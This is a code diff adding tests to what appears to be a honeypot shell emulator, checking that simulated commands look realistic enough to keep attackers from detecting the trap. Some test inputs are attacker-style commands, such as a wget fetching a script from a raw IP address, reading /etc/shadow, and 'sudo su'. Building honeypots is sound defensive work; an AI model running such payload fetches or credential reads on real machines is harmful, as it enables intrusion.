@@ -194,3 +194,65 @@ def test_fingerprint_is_stable_and_sequence_sensitive() -> None:
     c = SessionProfiler(commands=["id", "whoami", "sudo su"])
     assert a.fingerprint() == b.fingerprint()
     assert a.fingerprint() != c.fingerprint()
+
+
+# --- réalisme du shell (ne pas être détecté comme honeypot) -----------------
+def test_echo_expands_variables_and_strips_quotes() -> None:
+    state = ShellState(user="admin", cwd="/home/admin")
+    assert run_command(state, "echo $HOME") == "/home/admin"
+    assert run_command(state, 'echo "user=$USER"') == "user=admin"
+    assert run_command(state, "echo $UNKNOWN_VAR") == ""
+
+
+def test_ls_is_path_aware() -> None:
+    state = ShellState(user="admin", cwd="/home/admin")
+    root = run_command(state, "ls /")
+    assert "etc" in root and "usr" in root and "var" in root
+    assert run_command(state, "ls /home") == "admin  deploy"
+    # Le home reste cohérent quel que soit le cwd.
+    assert "backup.tar.gz" in run_command(state, "ls /home/admin")
+
+
+def test_standard_files_exist() -> None:
+    state = ShellState()
+    assert run_command(state, "cat /etc/hostname") == "prod-srv-01"
+    assert "Debian" in run_command(state, "cat /etc/issue")
+    assert "localhost" in run_command(state, "cat /etc/hosts")
+    assert run_command(state, "cat /etc/shadow") == "cat: /etc/shadow: Permission denied"
+
+
+def test_standard_tools_present() -> None:
+    state = ShellState()
+    assert run_command(state, "which python3") == "/usr/bin/python3"
+    assert run_command(state, "python3 --version") == "Python 3.11.2"
+    assert run_command(state, "nproc") == "4"
+    assert run_command(state, "arch") == "x86_64"
+    assert "10.0.2.15" in run_command(state, "ip a")
+    assert "default via" in run_command(state, "ip route")
+    assert run_command(state, "date")  # non vide, pas "command not found"
+
+
+def test_sudo_l_is_bait() -> None:
+    state = ShellState(user="admin")
+    assert "(ALL : ALL) ALL" in run_command(state, "sudo -l")
+
+
+def test_file_ops_succeed_silently() -> None:
+    state = ShellState()
+    assert run_command(state, "mkdir /srv/.x") == ""
+    assert run_command(state, "touch /srv/.x/a") == ""
+    assert run_command(state, "rm -f /srv/.x/a") == ""
+
+
+def test_wget_is_simulated_not_missing() -> None:
+    state = ShellState()
+    out = run_command(state, "wget http://1.2.3.4/p.sh -O /srv/p.sh")
+    assert "command not found" not in out
+    assert "saved" in out
+
+
+def test_unknown_command_still_not_found() -> None:
+    state = ShellState()
+    assert run_command(state, "definitelynotacommand") == (
+        "bash: definitelynotacommand: command not found"
+    )
